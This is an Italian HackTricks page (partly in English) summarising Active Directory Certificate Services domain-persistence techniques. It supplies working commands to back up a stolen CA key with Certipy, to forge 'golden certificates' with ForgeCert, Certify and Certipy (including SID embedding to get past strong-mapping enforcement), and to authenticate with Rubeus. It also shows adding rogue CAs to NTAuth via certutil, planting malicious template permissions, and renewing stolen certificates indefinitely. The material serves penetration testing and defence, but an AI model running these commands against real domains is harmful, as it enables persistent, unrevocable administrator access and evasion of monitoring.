# Persistenza del dominio AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Questa è una sintesi delle tecniche di persistenza nel dominio condivise in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulta il documento per ulteriori dettagli.

## Forgiare certificati con certificati CA rubati (Golden Certificate) - DPERSIST1

Come si riconosce che un certificato è un certificato CA?

Si può determinare che un certificato è una CA se sono soddisfatte diverse condizioni:

- Il certificato è memorizzato sul server CA, con la sua chiave privata protetta dal DPAPI della macchina, o da hardware come TPM/HSM se il sistema operativo lo supporta.
- I campi Issuer e Subject del certificato corrispondono al distinguished name della CA.
- Un'estensione "CA Version" è presente esclusivamente nei certificati CA.
- Il certificato è privo dei campi Extended Key Usage (EKU).

Per estrarre la chiave privata di questo certificato, lo strumento `certsrv.msc` sul server CA è il metodo supportato tramite la GUI integrata. Tuttavia, questo certificato non differisce dagli altri memorizzati nel sistema; pertanto, possono essere applicati metodi come la [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) per l'estrazione.

Il certificato e la chiave privata possono anche essere ottenuti usando Certipy con il seguente comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Una volta ottenuto il certificato CA e la sua chiave privata in formato `.pfx`, strumenti come [ForgeCert](https://github.com/GhostPack/ForgeCert) possono essere utilizzati per generare certificati validi:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> L'utente preso di mira per la falsificazione del certificato deve essere attivo e in grado di autenticarsi in Active Directory perché il processo abbia successo. Falsificare un certificato per account speciali come krbtgt è inefficace.

Questo certificato falsificato sarà **valido** fino alla data di scadenza specificata e finché il certificato root della CA è valido (di solito da 5 a **10+ anni**). È anche valido per le **machines**, quindi combinato con **S4U2Self**, un attaccante può **maintain persistence on any domain machine** finché il certificato della CA è valido.\
Inoltre, i **certificates generated** con questo metodo **cannot be revoked**, poiché la CA non è a conoscenza di essi.

### Operating under Strong Certificate Mapping Enforcement (2025+)

Since February 11, 2025 (after KB5014754 rollout), domain controllers default to **Full Enforcement** for certificate mappings. Practically this means your forged certificates must either:

- Contain a strong binding to the target account (for example, the SID security extension), or
- Be paired with a strong, explicit mapping on the target object’s `altSecurityIdentities` attribute.

A reliable approach for persistence is to mint a forged certificate chained to the stolen Enterprise CA and then add a strong explicit mapping to the victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Note
- Se puoi creare forged certificates che includono la SID security extension, questi verranno mappati implicitamente anche sotto Full Enforcement. Altrimenti, preferisci mappature esplicite e robuste. Vedi [account-persistence](account-persistence.md) per maggiori dettagli sulle mappature esplicite.
- La revoca non aiuta i difensori qui: i forged certificates non sono noti al CA database e quindi non possono essere revocati.

#### Forging compatibile con Full-Enforcement (SID-aware)

Strumenti aggiornati permettono di incorporare direttamente il SID, mantenendo i golden certificates utilizzabili anche quando i DCs rifiutano mappature deboli:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Incorporando la SID eviti di dover modificare `altSecurityIdentities`, che potrebbe essere monitorato, pur soddisfacendo i controlli di mapping più rigorosi.

## Trusting Rogue CA Certificates - DPERSIST2

L'oggetto `NTAuthCertificates` è definito per contenere uno o più **CA certificates** nell'attributo `cacertificate`, che Active Directory (AD) utilizza. Il processo di verifica da parte del **domain controller** prevede il controllo dell'oggetto `NTAuthCertificates` per trovare una voce corrispondente alla **CA specified** nel campo Issuer del **certificate** che si sta autenticando. L'autenticazione procede se viene trovata una corrispondenza.

Un certificato CA self-signed può essere aggiunto all'oggetto `NTAuthCertificates` da un attaccante, purché abbia il controllo su questo oggetto AD. Normalmente, solo i membri del gruppo **Enterprise Admin**, insieme a **Domain Admins** o **Administrators** nel **forest root’s domain**, hanno il permesso di modificare questo oggetto. Possono modificare l'oggetto `NTAuthCertificates` usando `certutil.exe` con il comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, oppure impiegando il [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandi aggiuntivi utili per questa tecnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Questa capacità è particolarmente rilevante se usata in combinazione con un metodo precedentemente descritto che utilizza ForgeCert per generare dinamicamente certificati.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Le opportunità per la **persistence** tramite modifiche ai **security descriptor dei componenti AD CS** sono numerose. Le modifiche descritte nella sezione "[Domain Escalation](domain-escalation.md)" possono essere implementate in modo malevolo da un attaccante con accesso elevato. Questo include l'aggiunta di "control rights" (es., WriteOwner/WriteDACL/etc.) a componenti sensibili come:

- L'oggetto **computer AD del server CA**
- Il **server RPC/DCOM del server CA**
- Qualsiasi **oggetto AD discendente o contenitore** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (per esempio, il contenitore Certificate Templates, il contenitore Certification Authorities, l'oggetto NTAuthCertificates, ecc.)
- **AD groups delegated rights to control AD CS** per default o dall'organizzazione (come il gruppo integrato Cert Publishers e i suoi membri)

Un esempio di implementazione malevola prevederebbe che un attaccante, con **permessi elevati** nel dominio, aggiunga il permesso **`WriteOwner`** al template di certificato predefinito **`User`**, designando l'attaccante come principal per il diritto. Per sfruttarlo, l'attaccante cambierebbe prima la proprietà del template **`User`** su se stesso. Successivamente, il valore **`mspki-certificate-name-flag`** verrebbe impostato a **1** sul template per abilitare **`ENROLLEE_SUPPLIES_SUBJECT`**, permettendo a un utente di fornire un Subject Alternative Name nella richiesta. In seguito, l'attaccante potrebbe **enroll** usando il **template**, scegliendo come alternative name un nome di **domain administrator**, e usare il certificato acquisito per autenticarsi come DA.

Impostazioni pratiche che un attaccante può configurare per la long-term domain persistence (vedi {{#ref}}domain-escalation.md{{#endref}} per dettagli completi e rilevamento):

- Flag di policy della CA che consentono SAN dai richiedenti (es., abilitando `EDITF_ATTRIBUTESUBJECTALTNAME2`). Questo mantiene percorsi simili a ESC1 sfruttabili.
- DACL del template o impostazioni che permettono l'emissione di certificati utilizzabili per l'autenticazione (es., aggiungendo Client Authentication EKU, abilitando `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controllare l'oggetto `NTAuthCertificates` o i contenitori CA per reintrodurre continuamente issuer rogue se i difensori tentano la pulizia.

> [!TIP]
> In ambienti rinforzati dopo KB5014754, abbinare queste misconfigurazioni con mappature esplicite e forti (`altSecurityIdentities`) assicura che i certificati emessi o forgati rimangano utilizzabili anche quando i DCs applicano una mappatura forte.

### Certificate renewal abuse (ESC14) per persistence

Se comprometti un certificato authentication-capable (o uno Enrollment Agent), puoi **rinnovarlo indefinitamente** finché il template di emissione rimane pubblicato e la tua CA continua a fidarsi della catena di issuer. Il rinnovo mantiene i binding di identità originali ma estende la validità, rendendo la rimozione difficile a meno che il template non venga corretto o la CA non venga ripubblicata.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Se i domain controller sono in **Full Enforcement**, aggiungi `-sid <victim SID>` (o usa un template che includa ancora l'estensione di sicurezza SID) in modo che il certificato leaf rinnovato continui a mantenere una mappatura forte senza toccare `altSecurityIdentities`. Gli attaccanti con privilegi di amministratore della CA possono anche modificare `policy\RenewalValidityPeriodUnits` per allungare i periodi di validità dei rinnovi prima di emettere un proprio cert.

## Riferimenti

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
